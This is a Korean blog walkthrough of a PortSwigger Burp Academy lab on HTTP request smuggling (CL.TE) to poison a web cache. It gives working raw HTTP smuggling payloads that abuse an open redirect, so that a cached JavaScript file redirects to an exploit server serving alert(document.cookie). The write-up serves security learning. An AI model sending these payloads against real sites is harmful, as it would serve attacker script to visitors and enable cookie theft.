---
layout: post
title: "Burp Academy-HTTP Request Smuggling 관련 취약점: Exploiting HTTP request smuggling to perform web cache poisoning"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, HTTP Request Smuggling]
toc: true
last_modified_at: 2024-04-01 21:00:00 +0900
---

# 개요
- HTTP Request Smuggling 취약점 문제이다. 
- 문제 주소: https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning
- 취약점 설명페이지1: https://portswigger.net/web-security/request-smuggling
- 취약점 설명페이지2: https://portswigger.net/web-security/request-smuggling/exploiting
- 난이도: EXPERT (어려움)

# 취약점 개요 (HTTP 요청 스머글링을 통한 웹 캐시 포이즈닝)
- CL.TE 패턴에서 오렌지색 부분까지가 스머글링되는 부분이다. 하늘색부분 요청의 Content-Length 헤더 값은 오렌지색 부분까지의 길이 값이다. 
- 프론트 엔드서버는 이 것은 두 개의 요청으로 본다. 백엔드 서버는 세 개의 요청을 본다. 
- 오렌지색 부분이 밀반입(스머글링)되면, `GET /static/include.js` 에 대한 응답을 기다리는 프론트엔드 서버에게 attacker-website.com에 대한 리다이렉트 응답이 회신된다.
- 그 결과 `GET /static/include.js` 에 대한 응답이 attacker-website.com에 대한 리다이렉트 응답으로 캐싱된다! 
- 참고로 주황색 부분은 취약한 웹 사이트에서 302응답이 돌아오는 엔드포인트를 선정할 필요가 있다. 

![](/images/burp-academy-hrs-cache-poison-pattern.png)
*출처:https://portswigger.net/web-security/request-smuggling/exploiting#using-http-request-smuggling-to-perform-web-cache-poisoning*

# 랩 개요
- 이 랩은 프론트 엔드 서버와 백엔드 서버로 구성되어 있다. 프론트 엔드 서버는 chunked encoding(TE헤더)을 지원하지 않는다. (즉, CL.TE패턴이다.)
- 프론트엔드 서버는 일부 응답을 캐싱한다.
- 랩을 풀려면 백엔드 서버에게 HTTP요청을 밀반입해서 캐시를 오염시킨다. 그 결과 자바스크립트에 대한 요청이 exploit서버로 리다이렉트되도록 하면 된다. 그리고 exploit서버에서 준비한 alert(document.cookie)가 실행되도록 하면 된다. 

```
This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server is configured to cache certain responses.

To solve the lab, perform a request smuggling attack that causes the cache to be poisoned, such that a subsequent request for a JavaScript file receives a redirection to the exploit server. The poisoned cache should alert document.cookie.
```

# 풀이 
1. 랩 서버를 살펴본다. 톱 페이지에는 `/resources/js/tracking.js`가 포함되어 있는 것을 볼 수 있다. 

![](/images/burp-academy-hrs-11-0.png)

그리고 `GET /resources/js/tracking.js` 요청의 응답에는 캐시가 사용되고 있는 것을 알 수 있다. 따라서 이 곳을 웹 캐시 포이즈닝의 타겟으로 삼을 수 있을 것이다. 

![](/images/burp-academy-hrs-11-1.png)

2. 다음 페이로드를 준비했다. GET /exploit 요청이 백엔드 서버로 밀반입되어 `GET /resources/js/tracking.js` 요청에 대한 응답을 기다리고 있는 프론트엔드 서버로 회신되면 프론트엔드 서버는 이 응답을 캐싱할 것이다. 

```http
POST / HTTP/1.1
Host: 0ad9001a04893b2789f029b300f700b2.web-security-academy.net
Cookie: session=NqmFb01lgHNowsNpIlm6Ugif2hN9WsuP
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Content-Length: 101
Transfer-Encoding: chunked

0

GET /exploit HTTP/1.1
Host: exploit-0af4004704b63bd0897f28b0013c00bf.exploit-server.net
Foo: XGET /resources/js/tracking.js HTTP/1.1

```

3. 그런데 결과는 다음과 같았다. 이 요청을 두번 요청하면 400 응답 `Duplicate header names are not allowed`가 돌아왔다. 아마 Host헤더 때문에 그런 것 같은데...

```
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Content-Type-Options: nosniff
Connection: close
Content-Length: 50

{"error":"Duplicate header names are not allowed"}
```

![](/images/burp-academy-hrs-11-2.png)

4. 모르겠다. 답을 본다. 

아하! 302응답이 돌아오는 엔드포인트를 찾는 것이 관건이었다. 블로그 글에서 다음 글을 보는 `Next Post`를 클릭했을 때의 요청 `GET /post/next?postId=9` 에 대한 응답이 302였다. 여기에 오픈리다이렉트 취약점이 있어서 임의의 Host 헤더에 대해서도 해당 주소로 회신을 해주고 있었다. 

```http
HTTP/2 302 Found
Location: https://0ad9001a04893b2789f029b300f700b2.web-security-academy.net/post?postId=10
X-Frame-Options: SAMEORIGIN
Content-Length: 0


```

5. 다시 풀어본다. 다음 요청을 보내본다. 

```http
POST / HTTP/1.1
Host: 0add00c20315cd8586a821b900f80025.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 129
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: anything
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```

두번 이어서 보내면 두번째 응답에서 302 응답, 그리고 Host헤더의 값을 임의의 값으로 설정할 수 있는 것을 볼 수 있다. 이 것으로 스머글링과 오픈 리다이렉트가 가능한 것을 알았다. 

![](/images/burp-academy-hrs-11-3.png)

6. exploit서버를 준비한다. /post 엔드포인트로 지정하고, Content-Type을 `text/javascript` 로 변경한다. 바디에서는 alert(document.cookie)가 실행되도록 한다. 

![](/images/burp-academy-hrs-11-4.png)

7. 웹 캐시를 오염시키기 위한 다음 요청을 보낸다. Repeater에서 Content-Length 값이 업데이트되지 않도록 설정에서 Update Content-Length 의 체크를 해제한다. 184는 x=1\r\n\r\n 까지의 길이를 의미한다. 


```http
POST / HTTP/1.1
Host: 0add00c20315cd8586a821b900f80025.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 184
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: exploit-0a6a00aa0364cd9886f120d6013200a4.exploit-server.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1

GET /resources/js/tracking.js HTTP/1.1
Host: 0add00c20315cd8586a821b900f80025.web-security-academy.net
Connection: close


```

7. 요청을 두번 보내면 두번째 응답부터는 exploit서버로의 302 리다이렉트가 회신되는 것을 볼 수 있다. 이 것으로 `GET /resources/js/tracking.js` 요청에 대한 응답이 exploit서버의 컨텐츠(`alert(document.cookie)`)로 오염되었을 것으로 볼 수 있다.  

![](/images/burp-academy-hrs-11-5.png)

8. Repeater에서 `GET /resources/js/tracking.js`로 요청해본다. 처음에는 캐시된 응답(정상적인 응답)이 돌아오지만 캐시의 Age를 넘어서면, 새로 캐싱된 응답(exploit서버로 리다이렉트)이 돌아온다. 

![](/images/burp-academy-hrs-11-6.png)


9. 웹 브라우저에서도 테스트해본다. 

`https://0add00c20315cd8586a821b900f80025.web-security-academy.net/resources/js/tracking.js` 로 접속하면 오염된 캐시가 동작하여 `https://exploit-0a6a00aa0364cd9886f120d6013200a4.exploit-server.net/post?postId=4`로 리다이렉트 된다. 

![](/images/burp-academy-hrs-11-7.png)

10. 다시 랩 서버를 보면 문제가 풀렸다는 메세지가 출력된다. 

![](/images/burp-academy-hrs-11-success.png)


정리해본다. 다음 조건 하에서 공격이 성립한다 .
1. 프론트 엔드서버에 캐싱 기능이 있다. 일부 엔드포인트(정적파일 요청등)에서 이 캐싱이 사용된다.
2. 오픈 리다이렉트 취약점이 있다. (임의의 Host 헤더에 값을 설정하는 것으로 임의의 호스트로 리다이렉트시킬 수 있다.)
3. HTTP 요청 스머글링이 가능하다. 

=> 오픈리다이렉트 되는 요청을 스머글링하고, 바로 뒤 이어서 정적 파일 요청을 보내면, 정적 파일 요청에 대한 응답이 직전의 리다이렉트요청에 대한 응답으로 돌아온다. 그 결과 캐시가 오염된다. 